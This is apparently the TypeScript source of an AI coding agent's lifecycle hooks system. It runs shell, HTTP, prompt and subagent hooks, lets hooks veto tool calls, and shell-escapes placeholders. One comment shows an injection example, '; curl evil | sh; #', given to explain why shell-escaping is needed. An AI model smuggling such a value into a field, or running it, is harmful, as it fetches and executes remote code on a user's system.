import { swallow } from '../utils/log';
/**
 * Hooks system — runs shell commands on lifecycle events of the agent.
 *
 * Port of Claude Code's hooks system (src/schemas/hooks.ts + src/utils/hooks/*).
 * This is the Fase 2.1 expansion:
 *  - 8 new lifecycle events (PreToolUse, PostToolUse, UserPromptSubmit,
 *    SessionStart, SessionEnd, PreCompact, PostCompact, Stop)
 *  - Pattern-based filtering via `if` (e.g., "Bash(git *)") so hooks only
 *    fire for matching tool calls
 *  - PreToolUse exit code 2 blocks the tool call (agent gets stderr back
 *    in place of the tool result — lets external policy override decisions)
 *  - Backwards compatible with the 6 legacy pipeline events
 *    (pre-task, post-task, pre-commit, post-commit, pre-dum, post-dum)
 *    that used the old `string[]` shape.
 *
 * Config file: ~/.makestudio/hooks.json OR <project>/.makestudio/hooks.json
 *
 * Preferred format (hooks by event, array of hook configs):
 *   {
 *     "PreToolUse": [
 *       { "type": "command", "command": "log_tool.sh {tool_name}", "if": "Bash(*)", "timeout": 30 }
 *     ],
 *     "PostToolUse": [
 *       { "type": "command", "command": "swc-check.sh {file_path}", "if": "Edit(*)" }
 *     ],
 *     "UserPromptSubmit": [
 *       { "type": "command", "command": "append-context.sh" }
 *     ]
 *   }
 *
 * Legacy format (still accepted — will migrate on first write):
 *   {
 *     "pre-task": ["echo starting {task}"],
 *     "post-commit": ["git status"]
 *   }
 *
 * Placeholders interpolated into commands:
 *   {tool_name}, {tool_input} (JSON), {file_path} (from tool_input.file_path),
 *   {cwd}, {user_message}, {projectPath}, plus legacy {task}, {dum}, {files}.
 *
 * Blocking behaviour:
 *   - Default: hook failure is logged via `tuiLog(warn)` but does NOT block.
 *   - Event PreToolUse: exit code 2 (and only 2) BLOCKS the tool. stderr
 *     of the hook is returned to the model as the tool result so the model
 *     can see why it was blocked and react.
 */

import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { spawn } from 'child_process';
import { subprocessEnv } from './subprocess-env';
import { loadSettings } from './settings';

/**
 * Tracking for fire-and-forget async hooks. Maps PID → metadata so the REPL
 * can list/cancel them via /hooks-status (vs Claude Code's executeInBackground
 * + AsyncHookRegistry, which we approximate). Cleaned up on the child's exit.
 */
const asyncHooksInFlight = new Map<number, { event: string; command: string; startedAt: number }>();
export function listAsyncHooks(): Array<{ pid: number; event: string; command: string; startedAt: number }> {
  return Array.from(asyncHooksInFlight.entries()).map(([pid, info]) => ({ pid, ...info }));
}

// ── Event identifiers ────────────────────────────────────────────────────

/** Modern Claude Code-style event names (Fase 2.1 + expansion Fase 6.7). */
export type LifecycleEvent =
  | 'PreToolUse'
  | 'PostToolUse'
  | 'PostToolUseFailure'   // fires when PostToolUse path returns an error
  | 'UserPromptSubmit'
  | 'SessionStart'
  | 'SessionEnd'
  | 'PreCompact'
  | 'PostCompact'
  | 'Stop'
  | 'PermissionRequest'    // policy returned 'ask' and we're about to prompt
  | 'PermissionDenied'     // policy/user denied a tool call
  | 'SubagentStart'        // dispatch_agent entered
  | 'SubagentStop'         // dispatch_agent exited (success or abort)
  | 'Setup';               // project-setup hook fires on first SessionStart

/** Legacy pipeline event names — kept for backward compatibility. */
export type LegacyPipelineEvent =
  | 'pre-task' | 'post-task'
  | 'pre-commit' | 'post-commit'
  | 'pre-dum' | 'post-dum';

export type HookEvent = LifecycleEvent | LegacyPipelineEvent;

// ── Hook shape ───────────────────────────────────────────────────────────

/** A single hook entry. 4 types are supported:
 *   - command: shell command (historical default)
 *   - http:    POST tool context to a URL (compliance gateway, audit log)
 *   - prompt:  run a prompt through the fast provider (lightweight check)
 *   - agent:   dispatch a subagent type (full agentic verifier) */
export interface CommandHook {
  type: 'command';
  command: string;
  /**
   * Permission-rule syntax filter. Hook only fires if the tool call matches.
   * Examples: "Bash(git *)" (any git command via Bash),
   *           "Edit(src/**\/*.ts)" (Edits on TS files),
   *           "*" (always — default when `if` is absent).
   * Evaluated against `tool_name` + `tool_input.command` / `tool_input.file_path`.
   */
  if?: string;
  /** Seconds. Defaults to 60. */
  timeout?: number;
  statusMessage?: string;
  /** Run in background (fire-and-forget). Default false. */
  async?: boolean;
  /**
   * Reserves the option of veto. When set together with `async: true`, the
   * hook runs synchronously instead of being backgrounded — so its exit
   * code 2 still blocks the tool call. The "rewake the model on exit 2"
   * behaviour described historically is NOT implemented here (the agent
   * has no mid-stream wake mechanism); using asyncRewake today is exactly
   * equivalent to leaving `async` off, for command hooks. Kept for config
   * compat — prefer omitting `async` if you want sync veto.
   */
  asyncRewake?: boolean;
}

export interface HttpHook {
  type: 'http';
  /** Target URL (must be http/https). SSRF-guarded by web-guard.ts. */
  url: string;
  /** HTTP method. Default POST. */
  method?: 'POST' | 'PUT' | 'PATCH';
  /** Extra headers to send. Authorization, etc. */
  headers?: Record<string, string>;
  if?: string;
  timeout?: number;
  async?: boolean;
}

export interface PromptHook {
  type: 'prompt';
  /** The prompt text; supports the same placeholders as command hooks. */
  prompt: string;
  /** 'fast' uses the role=fast provider (cheap); 'primary' uses the main. */
  model?: 'fast' | 'primary';
  /** If the model replies with this substring (case-insensitive), the hook
   *  "vetoes" — equivalent to command exit-2. */
  vetoIfContains?: string;
  if?: string;
  timeout?: number;
}

export interface AgentHook {
  type: 'agent';
  /** subagent_type to dispatch (must exist in built-ins or custom agents). */
  subagent_type: string;
  /** Task prompt to pass the agent. Supports placeholders. */
  task: string;
  /** Veto substring, same semantic as PromptHook. */
  vetoIfContains?: string;
  if?: string;
  timeout?: number;
}

export type Hook = CommandHook | HttpHook | PromptHook | AgentHook;

/** Raw hooks file shape — accepts both new and legacy. */
export interface HooksFile {
  [event: string]: Hook[] | string[] | undefined;
}

export interface HookContext {
  projectPath?: string;
  // Fields used by lifecycle events (new):
  toolName?: string;
  toolInput?: any;
  userMessage?: string;
  // Fields used by legacy pipeline events:
  task?: string;
  dum?: string;
  files?: string[];
  /**
   * AbortController of the current chat turn. When the user hits Esc Esc
   * (or any other turn-cancel path), the same signal kills running hooks —
   * matches Claude Code's wrapSpawn(child, signal, ...) propagation.
   */
  currentAbortController?: AbortController;
}

export interface HookRunResult {
  ok: boolean;
  failures: string[];
  /** Set only when a PreToolUse hook blocked the tool call (exit code 2). */
  blocked?: { reason: string };
}

// ── Load & merge hooks ───────────────────────────────────────────────────

function loadHooksFrom(file: string): HooksFile {
  try {
    if (!fs.existsSync(file)) return {};
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch {
    return {};
  }
}

function mergeHooks(...sources: HooksFile[]): HooksFile {
  const merged: HooksFile = {};
  for (const src of sources) {
    for (const [event, hooks] of Object.entries(src)) {
      if (!hooks) continue;
      const prev = merged[event];
      merged[event] = [
        ...(Array.isArray(prev) ? (prev as any[]) : []),
        ...(Array.isArray(hooks) ? (hooks as any[]) : []),
      ] as any;
    }
  }
  return merged;
}

/**
 * In-memory hook registry populated by plugins (via plugin-repl-bridge).
 * These entries are prepended to the file-loaded hooks so plugin-supplied
 * audits fire BEFORE user hooks. Keyed by event.
 */
const pluginHooks: Record<string, any[]> = {};

/**
 * Stable identity for dedupe. Two entries are "the same" if they share
 * type + the type's primary key (command / url / prompt / subagent_type)
 * AND the same `if` matcher. Long-running sessions can re-register hooks
 * (e.g. plugin reload) — without dedupe the same hook fires twice.
 */
function pluginHookKey(entry: any): string {
  if (!entry || typeof entry !== 'object') return JSON.stringify(entry);
  const ifPart = entry.if ?? '';
  switch (entry.type) {
    case 'command': return `command|${entry.command}|${ifPart}`;
    case 'http':    return `http|${entry.url}|${ifPart}`;
    case 'prompt':  return `prompt|${entry.prompt}|${ifPart}`;
    case 'agent':   return `agent|${entry.subagent_type}|${entry.task}|${ifPart}`;
    default:        return JSON.stringify(entry);
  }
}

export function registerPluginHooks(event: string, entries: any[]): void {
  if (!pluginHooks[event]) pluginHooks[event] = [];
  const seen = new Set(pluginHooks[event].map(pluginHookKey));
  for (const e of entries) {
    const k = pluginHookKey(e);
    if (seen.has(k)) continue; // already registered — skip duplicate
    seen.add(k);
    pluginHooks[event].push(e);
  }
}
export function __clearPluginHooksForTests(): void {
  for (const k of Object.keys(pluginHooks)) delete pluginHooks[k];
}

export function loadHooks(projectPath?: string): HooksFile {
  // Policy gate — equivalent to Claude Code's policySettings.allowManagedHooksOnly.
  // When set, user/project hooks are ignored; only plugin/builtin hooks fire.
  // Lets admins lock hook execution down to known-good code.
  //
  // Two sources, OR'd together (whichever is more restrictive wins):
  //   - process.env.MAKESTUDIO_FORCE_MANAGED_HOOKS_ONLY — session-only,
  //     auto-set by ws-client when connected to dark-factory backend.
  //   - settings.policy.allowManagedHooksOnly — persistent, user/admin-set.
  let managedOnly =
    process.env.MAKESTUDIO_FORCE_MANAGED_HOOKS_ONLY === '1' ||
    process.env.MAKESTUDIO_FORCE_MANAGED_HOOKS_ONLY === 'true';
  if (!managedOnly) {
    try {
      managedOnly = loadSettings()?.policy?.allowManagedHooksOnly === true;
    } catch (err) { swallow(err); }
  }

  if (managedOnly) {
    return mergeHooks(pluginHooks);
  }

  const userFile = path.join(os.homedir(), '.makestudio', 'hooks.json');
  const projectFile = projectPath ? path.join(projectPath, '.makestudio', 'hooks.json') : null;
  return mergeHooks(
    pluginHooks,                        // plugins first (fire first)
    loadHooksFrom(userFile),
    projectFile ? loadHooksFrom(projectFile) : {},
  );
}

// ── Interpolation ────────────────────────────────────────────────────────

/**
 * Shell-escape a value by wrapping in single quotes and escaping any embedded
 * single quotes via `'\''`. Any string is safe inside `'...'` except `'` itself.
 * Without this, LLM-controlled tool input like `file_path: '; curl evil | sh; #'`
 * becomes shell input once interpolated. See adversarial stress test finding #2.
 */
function shellEscape(v: string): string {
  return `'${String(v).replace(/'/g, `'\\''`)}'`;
}

function interpolate(cmd: string, ctx: HookContext): string {
  const filePath = ctx.toolInput?.file_path || ctx.toolInput?.filePath || '';
  const shellCmd = ctx.toolInput?.command || '';
  return cmd
    // New lifecycle placeholders — all values shell-escaped.
    .replace(/\{tool_name\}/g, shellEscape(ctx.toolName || ''))
    .replace(/\{tool_input\}/g, shellEscape(JSON.stringify(ctx.toolInput || {})))
    .replace(/\{file_path\}/g, shellEscape(filePath))
    .replace(/\{shell_command\}/g, shellEscape(shellCmd))
    .replace(/\{user_message\}/g, shellEscape(ctx.userMessage || ''))
    .replace(/\{cwd\}/g, shellEscape(ctx.projectPath || process.cwd()))
    // Legacy placeholders — shell-escape as well.
    .replace(/\{task\}/g, shellEscape(ctx.task || ''))
    .replace(/\{dum\}/g, shellEscape(ctx.dum || ''))
    .replace(/\{files\}/g, (ctx.files || []).map(shellEscape).join(' '))
    .replace(/\{projectPath\}/g, shellEscape(ctx.projectPath || process.cwd()));
}

// ── Permission-rule matching ─────────────────────────────────────────────

/**
 * Checks whether a hook's `if` pattern matches the current tool call.
 * Pattern syntax: `Tool(matcher)` where matcher is a glob applied to
 *   - `tool_input.command` when Tool=Bash
 *   - `tool_input.file_path` when Tool in {Read, Edit, Write, MultiEdit, Glob, Grep, LSP}
 *   - `tool_input.url` when Tool=WebFetch
 * A bare `*` always matches. An empty/missing pattern always matches.
 *
 * This is intentionally a subset of Fase 2.5 (full permission-rule syntax).
 * The full parser + shadow-detection lives in permissions.ts after 2.5.
 */
function matchesIfPattern(pattern: string | undefined, toolName: string, toolInput: any): boolean {
  if (!pattern || pattern === '*') return true;
  const m = pattern.match(/^([A-Za-z_][A-Za-z0-9_]*)\((.*)\)$/);
  if (!m) {
    // Free-form string — match against tool_name directly.
    return pattern === toolName;
  }
  const [, tool, matcher] = m;
  if (tool !== toolName) return false;
  // Normalise the matcher into a regex: `*` → `.*`, `?` → `.`.
  const rx = new RegExp('^' + matcher.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$');
  const subject = toolInput?.command || toolInput?.file_path || toolInput?.filePath || toolInput?.url || '';
  return rx.test(String(subject));
}

// ── Runtime ──────────────────────────────────────────────────────────────

function isCommandHook(h: any): h is CommandHook {
  return h && typeof h === 'object' && h.type === 'command' && typeof h.command === 'string';
}
function isHttpHook(h: any): h is HttpHook {
  return h && typeof h === 'object' && h.type === 'http' && typeof h.url === 'string';
}
function isPromptHook(h: any): h is PromptHook {
  return h && typeof h === 'object' && h.type === 'prompt' && typeof h.prompt === 'string';
}
function isAgentHook(h: any): h is AgentHook {
  return h && typeof h === 'object' && h.type === 'agent' && typeof h.subagent_type === 'string' && typeof h.task === 'string';
}

async function runHttpHook(hook: HttpHook, event: HookEvent, ctx: HookContext): Promise<{ veto?: string; error?: string }> {
  try {
    // SSRF guard before fetching — same rail as WebFetch.
    try {
      const { guardFetchUrl } = require('./ai/web-guard');
      const g = await guardFetchUrl(hook.url);
      if (!g.ok) return { error: `http hook SSRF-blocked: ${g.reason}` };
    } catch (err) { swallow(err); }

    const body = {
      event,
      toolName: ctx.toolName || null,
      toolInput: ctx.toolInput || null,
      userMessage: ctx.userMessage || null,
      projectPath: ctx.projectPath || null,
    };
    const timeoutMs = (hook.timeout ?? 30) * 1000;
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);
    t.unref?.();
    try {
      const res: any = await (globalThis as any).fetch(hook.url, {
        method: hook.method || 'POST',
        headers: { 'Content-Type': 'application/json', ...(hook.headers || {}) },
        body: JSON.stringify(body),
        signal: controller.signal,
      });
      // A hook server signals veto via HTTP 412 Precondition Failed.
      if (res.status === 412) {
        const text = await res.text().catch(() => '');
        return { veto: text.slice(0, 500) || 'http hook returned 412' };
      }
      if (!res.ok) return { error: `http hook ${res.status}` };
      return {};
    } finally {
      clearTimeout(t);
    }
  } catch (e: any) {
    return { error: e.message?.substring(0, 200) || String(e) };
  }
}

/**
 * Wrap a promise with a timeout AND an external AbortSignal. Resolves to
 * the inner promise's value when it settles; rejects with a typed error
 * when timeout expires or the signal aborts. Used to enforce hook timeouts
 * uniformly across prompt/agent hook paths (where the underlying SDKs
 * don't all surface AbortSignal natively).
 */
async function withHookTimeout<T>(
  promise: Promise<T>,
  timeoutMs: number,
  abortSignal?: AbortSignal,
): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    let settled = false;
    const settle = (fn: () => void) => { if (!settled) { settled = true; fn(); } };

    const timer = setTimeout(() => {
      settle(() => reject(new Error(`hook timed out after ${timeoutMs}ms`)));
    }, timeoutMs);
    timer.unref?.();

    const onAbort = () => settle(() => reject(new Error('hook aborted (turn cancelled)')));
    if (abortSignal) {
      if (abortSignal.aborted) onAbort();
      else abortSignal.addEventListener('abort', onAbort, { once: true });
    }

    promise.then(
      (v) => settle(() => { clearTimeout(timer); resolve(v); }),
      (e) => settle(() => { clearTimeout(timer); reject(e); }),
    );
  });
}

async function runPromptHook(hook: PromptHook, ctx: HookContext): Promise<{ veto?: string; error?: string }> {
  const timeoutMs = (hook.timeout ?? 60) * 1000;
  try {
    const { getProvider } = require('./ai/providers');
    // Read provider from a module-level default; if the caller set
    // ctx.provider, honor it. Otherwise fall back to backend default.
    const providerName = (ctx as any).provider || 'anthropic';
    const provider = getProvider(providerName);
    const send = hook.model === 'fast' && provider.sendSmall ? provider.sendSmall.bind(provider) : provider.sendMessage.bind(provider);
    const prompt = interpolate(hook.prompt, ctx);
    const response = await withHookTimeout<any>(
      send({
        system: 'You are a hook evaluator. Respond briefly. If you decide to VETO a tool call, include the literal VETO_TOKEN anywhere in your reply.',
        messages: [{ role: 'user', content: prompt.replace(/^'|'$/g, '') }],
        tools: [],
      }),
      timeoutMs,
      ctx.currentAbortController?.signal,
    );
    const text = (response.content || [])
      .filter((b: any) => b.type === 'text')
      .map((b: any) => b.text).join('');
    if (hook.vetoIfContains && text.toLowerCase().includes(hook.vetoIfContains.toLowerCase())) {
      return { veto: text.slice(0, 500) };
    }
    if (text.includes('VETO_TOKEN')) {
      return { veto: text.slice(0, 500) };
    }
    return {};
  } catch (e: any) {
    return { error: e.message?.substring(0, 200) || String(e) };
  }
}

/**
 * Build the env passed to a command hook. Starts from `subprocessEnv()` —
 * which respects MAKESTUDIO_SUBPROCESS_ENV_SCRUB to scrub provider/cloud/GHA
 * secrets — then layers the MAKESTUDIO_* placeholders on top so hooks can
 * read tool context without having to parse the command line.
 */
function buildHookEnv(event: HookEvent, ctx: HookContext): NodeJS.ProcessEnv {
  return {
    ...subprocessEnv(),
    MAKESTUDIO_HOOK_EVENT: event,
    MAKESTUDIO_TOOL_NAME: ctx.toolName || '',
    MAKESTUDIO_TOOL_INPUT: JSON.stringify(ctx.toolInput || {}),
    MAKESTUDIO_FILE_PATH: ctx.toolInput?.file_path || ctx.toolInput?.filePath || '',
    MAKESTUDIO_SHELL_COMMAND: ctx.toolInput?.command || '',
    MAKESTUDIO_USER_MESSAGE: ctx.userMessage || '',
    MAKESTUDIO_CWD: ctx.projectPath || process.cwd(),
  };
}

/**
 * Synchronously-awaited command hook. Replaces the previous execSync path:
 *  - non-blocking spawn (event loop stays responsive)
 *  - AbortSignal propagation from the chat turn (Esc Esc kills the hook)
 *  - secrets scrubbed via subprocessEnv() when policy gate is on
 *  - exit code 2 maps to veto for PreToolUse/PermissionRequest/UserPromptSubmit
 */
function runCommandHook(
  hook: CommandHook,
  ctx: HookContext,
  event: HookEvent,
): Promise<{ veto?: string; error?: string }> {
  const cmd = interpolate(hook.command, ctx);
  const timeoutMs = (hook.timeout ?? 60) * 1000;

  return new Promise((resolve) => {
    const proc = spawn('/bin/sh', ['-c', cmd], {
      cwd: ctx.projectPath || process.cwd(),
      env: buildHookEnv(event, ctx),
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    const stderrChunks: Buffer[] = [];
    let timedOut = false;
    let aborted = false;
    let settled = false;

    const settle = (val: { veto?: string; error?: string }) => {
      if (settled) return;
      settled = true;
      resolve(val);
    };

    // Hard timeout
    const timer = setTimeout(() => {
      timedOut = true;
      try { proc.kill('SIGTERM'); } catch (err) { swallow(err); }
      setTimeout(() => { try { proc.kill('SIGKILL'); } catch (err) { swallow(err); } }, 2_000).unref();
    }, timeoutMs);
    timer.unref();

    // Abort propagation from the chat turn — Esc Esc kills the hook too.
    const abortSignal = ctx.currentAbortController?.signal;
    const onAbort = () => {
      aborted = true;
      try { proc.kill('SIGTERM'); } catch (err) { swallow(err); }
      setTimeout(() => { try { proc.kill('SIGKILL'); } catch (err) { swallow(err); } }, 2_000).unref();
    };
    if (abortSignal) {
      if (abortSignal.aborted) onAbort();
      else abortSignal.addEventListener('abort', onAbort, { once: true });
    }

    proc.stderr?.on('data', (chunk: Buffer) => stderrChunks.push(chunk));
    // Drain stdout so the pipe buffer doesn't fill up (we don't currently
    // surface stdout to the LLM, but a stuck buffer would hang the child).
    proc.stdout?.on('data', () => { /* drained */ });

    proc.on('error', (err) => {
      clearTimeout(timer);
      if (abortSignal) abortSignal.removeEventListener('abort', onAbort);
      settle({ error: `hook spawn failed: ${err.message}` });
    });

    proc.on('exit', (code, signal) => {
      clearTimeout(timer);
      if (abortSignal) abortSignal.removeEventListener('abort', onAbort);

      const stderrText = Buffer.concat(stderrChunks).toString('utf8').trim();
      if (timedOut) return settle({ error: `hook timed out after ${timeoutMs}ms` });
      if (aborted)  return settle({ error: 'hook aborted (turn cancelled)' });
      if (code === 2) {
        // Exit 2 vetoes — caller decides if this event is allowed to veto.
        return settle({ veto: stderrText || 'hook blocked the tool call' });
      }
      if (code !== 0) {
        return settle({ error: `hook exited ${code}${signal ? ` (${signal})` : ''}: ${stderrText.slice(0, 200)}` });
      }
      settle({});
    });
  });
}

/**
 * Fire-and-forget command hook. Tracks the PID in `asyncHooksInFlight` so
 * the REPL can list running async hooks and clean up on exit. Errors are
 * swallowed (caller is "async, no veto"); a debug log captures them.
 */
function runCommandHookAsync(hook: CommandHook, ctx: HookContext, event: HookEvent): void {
  const cmd = interpolate(hook.command, ctx);
  let proc: ReturnType<typeof spawn>;
  try {
    proc = spawn('/bin/sh', ['-c', cmd], {
      cwd: ctx.projectPath || process.cwd(),
      env: buildHookEnv(event, ctx),
      stdio: 'ignore',
      detached: true,
    });
  } catch {
    return; // fire-and-forget
  }

  const pid = proc.pid;
  if (typeof pid === 'number') {
    asyncHooksInFlight.set(pid, { event, command: cmd.slice(0, 200), startedAt: Date.now() });
    proc.on('exit', () => { asyncHooksInFlight.delete(pid); });
    proc.on('error', () => { asyncHooksInFlight.delete(pid); });
  }
  proc.unref?.();
}

async function runAgentHook(hook: AgentHook, ctx: HookContext): Promise<{ veto?: string; error?: string }> {
  // AgentHook can dispatch a full subagent loop, so default timeout is
  // longer than the command/prompt hook default.
  const timeoutMs = (hook.timeout ?? 300) * 1000;
  try {
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    // eval('require') hides this back-edge from rollup's cycle detector
    // (hooks → tools → coord-tools → client → subagent-dispatch → hooks).
    const { executeTool } = eval('require')('./ai/tools');
    const task = interpolate(hook.task, ctx).replace(/^'|'$/g, '');
    const result = await withHookTimeout<string>(
      executeTool('dispatch_agent', {
        task,
        subagent_type: hook.subagent_type,
      }, { cwd: ctx.projectPath || process.cwd(), approvedTools: new Set(), autoApprove: false, readCache: new Map(), messages: [] }),
      timeoutMs,
      ctx.currentAbortController?.signal,
    );
    const parsed = (() => { try { return JSON.parse(result); } catch { return { summary: String(result) }; } })();
    const summary: string = parsed.summary || '';
    if (hook.vetoIfContains && summary.toLowerCase().includes(hook.vetoIfContains.toLowerCase())) {
      return { veto: summary.slice(0, 500) };
    }
    return {};
  } catch (e: any) {
    return { error: e.message?.substring(0, 200) || String(e) };
  }
}

export async function runHooks(event: HookEvent, ctx: HookContext = {}): Promise<HookRunResult> {
  const hooks = loadHooks(ctx.projectPath);
  const entries = hooks[event];
  if (!entries || entries.length === 0) return { ok: true, failures: [] };

  const failures: string[] = [];
  const canVeto = event === 'PreToolUse' || event === 'PermissionRequest' || event === 'UserPromptSubmit';

  for (const raw of entries) {
    // Shape 1: legacy string command — wrap as CommandHook with no filter.
    const hook: Hook = typeof raw === 'string'
      ? ({ type: 'command', command: raw } as CommandHook)
      : (raw as Hook);

    // Skip non-matching hooks (all 4 types honor the `if` filter uniformly).
    const ifClause = (hook as any).if;
    if (!matchesIfPattern(ifClause, ctx.toolName || '', ctx.toolInput)) continue;

    // HTTP hook
    if (isHttpHook(hook)) {
      if (hook.async) { void runHttpHook(hook, event, ctx); continue; }
      const r = await runHttpHook(hook, event, ctx);
      if (r.veto && canVeto) return { ok: false, failures: [], blocked: { reason: r.veto } };
      if (r.error) failures.push(`${event} http hook ${hook.url} failed: ${r.error}`);
      continue;
    }

    // Prompt hook
    if (isPromptHook(hook)) {
      const r = await runPromptHook(hook, ctx);
      if (r.veto && canVeto) return { ok: false, failures: [], blocked: { reason: r.veto } };
      if (r.error) failures.push(`${event} prompt hook failed: ${r.error}`);
      continue;
    }

    // Agent hook
    if (isAgentHook(hook)) {
      const r = await runAgentHook(hook, ctx);
      if (r.veto && canVeto) return { ok: false, failures: [], blocked: { reason: r.veto } };
      if (r.error) failures.push(`${event} agent hook ${hook.subagent_type} failed: ${r.error}`);
      continue;
    }

    if (!isCommandHook(hook)) continue;

    if (hook.async && !hook.asyncRewake) {
      // Fire-and-forget — register PID for /hooks-status, swallow errors.
      void runCommandHookAsync(hook, ctx, event);
      continue;
    }

    const r = await runCommandHook(hook, ctx, event);
    if (r.veto && canVeto) return { ok: false, failures: [], blocked: { reason: r.veto } };
    if (r.error) failures.push(`${event} hook failed: ${r.error.slice(0, 200)}`);
  }

  return { ok: failures.length === 0, failures };
}

// ── Persistence + test sandbox (Phase 8) ─────────────────────────────────

/**
 * Persist a HooksFile to disk. Mirrors the loadHooks() shape — top-level
 * keys are event names mapped to arrays of Hook entries. The legacy
 * shape (string[]) round-trips cleanly because mergeHooks accepts both.
 *
 * scope='user' writes to ~/.makestudio/hooks.json
 * scope='project' writes to <projectPath>/.makestudio/hooks.json
 */
export function saveHooks(
  hooks: HooksFile,
  scope: 'user' | 'project' = 'user',
  projectPath?: string,
): HooksFile {
  const file =
    scope === 'project'
      ? path.join(projectPath || process.cwd(), '.makestudio', 'hooks.json')
      : path.join(os.homedir(), '.makestudio', 'hooks.json');

  // Strip empty event arrays so the file stays clean (loadHooks treats
  // missing/empty equivalently).
  const cleaned: HooksFile = {};
  for (const [event, entries] of Object.entries(hooks)) {
    if (!entries) continue;
    if (Array.isArray(entries) && entries.length === 0) continue;
    cleaned[event] = entries;
  }

  try {
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, JSON.stringify(cleaned, null, 2), 'utf8');
  } catch (e: any) {
    throw new Error(`Failed to write ${file}: ${e?.message ?? e}`);
  }
  return cleaned;
}

/**
 * Test-run a single hook with a mock context — does NOT touch the real
 * load/run path. Used by the Hooks settings UI to give immediate feedback
 * before the hook is wired into a live event.
 *
 * Returns stdout/stderr/exitCode for command hooks; for http/prompt/agent
 * the return is informational (the test path stays read-only — running a
 * full subagent or hitting an external HTTP endpoint from the settings
 * page is out of scope for MVP).
 */
export interface HookTestResult {
  ok: boolean;
  hookType: Hook['type'];
  exitCode?: number;
  stdout?: string;
  stderr?: string;
  durationMs: number;
  veto?: string;
  error?: string;
  /** True when the test path intentionally did NOT run the hook (e.g. http
   *  hooks aren't fired by default from the settings UI to avoid hitting
   *  external webhooks). The UI surfaces this distinct from a real success. */
  skipped?: boolean;
  /** Optional human-readable note shown alongside skipped/short-circuit results. */
  note?: string;
}

/**
 * Optional knobs for testHook(). `runHttp: true` lets the settings UI fire
 * the http hook for real — useful when the user wants to verify the endpoint
 * end-to-end. Defaults to false because the test runner is invoked freely
 * from the UI and external webhooks shouldn't be triggered without intent.
 */
export interface HookTestOptions {
  runHttp?: boolean;
}

export async function testHook(
  hook: Hook,
  ctx: HookContext = {},
  options: HookTestOptions = {},
): Promise<HookTestResult> {
  const startedAt = Date.now();

  // Pre-check the `if` filter — if it doesn't match the mock context, the
  // hook would never fire in production. Surface that to the UI so the
  // user can fix the pattern before saving.
  const ifClause = (hook as any).if;
  if (
    ifClause &&
    !matchesIfPattern(ifClause, ctx.toolName || '', ctx.toolInput)
  ) {
    return {
      ok: false,
      hookType: hook.type,
      durationMs: Date.now() - startedAt,
      error: `if pattern "${ifClause}" did not match mock toolName="${ctx.toolName ?? ''}"`,
    };
  }

  if (hook.type === 'command') {
    const cmd = interpolate(hook.command, ctx);
    const timeoutMs = (hook.timeout ?? 30) * 1000;
    return new Promise((resolve) => {
      const proc = spawn('/bin/sh', ['-c', cmd], {
        cwd: ctx.projectPath || process.cwd(),
        env: buildHookEnv('PreToolUse', ctx),
        stdio: ['ignore', 'pipe', 'pipe'],
      });
      const out: Buffer[] = [];
      const err: Buffer[] = [];
      let timedOut = false;
      const timer = setTimeout(() => {
        timedOut = true;
        try { proc.kill('SIGTERM'); } catch (err) { swallow(err); }
        setTimeout(() => { try { proc.kill('SIGKILL'); } catch (err) { swallow(err); } }, 1_500).unref();
      }, timeoutMs);
      timer.unref();
      proc.stdout?.on('data', (b: Buffer) => out.push(b));
      proc.stderr?.on('data', (b: Buffer) => err.push(b));
      proc.on('error', (e) => {
        clearTimeout(timer);
        resolve({
          ok: false,
          hookType: 'command',
          durationMs: Date.now() - startedAt,
          error: `spawn failed: ${e.message}`,
        });
      });
      proc.on('exit', (code) => {
        clearTimeout(timer);
        const stdout = Buffer.concat(out).toString('utf8');
        const stderr = Buffer.concat(err).toString('utf8');
        if (timedOut) {
          return resolve({
            ok: false,
            hookType: 'command',
            durationMs: Date.now() - startedAt,
            stdout,
            stderr,
            error: `timed out after ${timeoutMs}ms`,
          });
        }
        const veto = code === 2 ? (stderr.trim() || 'exit 2 — would veto in PreToolUse') : undefined;
        resolve({
          ok: code === 0,
          hookType: 'command',
          exitCode: code ?? undefined,
          stdout,
          stderr,
          durationMs: Date.now() - startedAt,
          veto,
        });
      });
    });
  }

  if (hook.type === 'http') {
    // Default: don't fire real HTTP from the settings UI — the user might
    // be just clicking "test" to validate config, and webhook endpoints
    // often have side effects. When opt-in (runHttp), reuse runHttpHook
    // so the path matches production (SSRF guard, 412→veto, timeout).
    if (!options.runHttp) {
      return {
        ok: false,
        hookType: 'http',
        durationMs: Date.now() - startedAt,
        skipped: true,
        note: `HTTP hook não foi executado pela UI (evita disparar webhook externo sem intenção). Reenvie marcando "executar de verdade" para testar end-to-end. URL: ${hook.url}`,
      };
    }
    const r = await runHttpHook(hook, 'PreToolUse', ctx);
    return {
      ok: !r.veto && !r.error,
      hookType: 'http',
      durationMs: Date.now() - startedAt,
      veto: r.veto,
      error: r.error,
    };
  }

  if (hook.type === 'prompt') {
    return {
      ok: false,
      hookType: 'prompt',
      durationMs: Date.now() - startedAt,
      skipped: true,
      note: `Prompt hook não é executado pela UI (consome tokens do provider). Prompt configurado:\n${hook.prompt.slice(0, 300)}${hook.prompt.length > 300 ? '…' : ''}`,
    };
  }

  if (hook.type === 'agent') {
    return {
      ok: false,
      hookType: 'agent',
      durationMs: Date.now() - startedAt,
      skipped: true,
      note: `Agent hook não é executado pela UI (caro + side-effects). Subagent: ${hook.subagent_type}\nTask: ${hook.task.slice(0, 300)}${hook.task.length > 300 ? '…' : ''}`,
    };
  }

  return {
    ok: false,
    hookType: (hook as any).type,
    durationMs: Date.now() - startedAt,
    error: `unknown hook type: ${(hook as any).type}`,
  };
}
